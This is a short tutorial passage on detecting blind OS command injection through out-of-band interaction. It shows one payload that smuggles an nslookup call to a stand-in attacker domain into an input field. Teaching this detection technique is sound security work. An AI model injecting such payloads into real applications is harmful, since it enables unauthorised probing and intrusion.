You can use an injected command that will trigger an out-of-band network interaction with a system that you control, using OAST techniques. For example:

    '& nslookup kgji2ohoyw.web-attacker.com &'

This payload uses the nslookup command to cause a DNS lookup for the specified domain. The attacker can monitor for the specified lookup occurring, and thereby detect that the command was successfully injected.
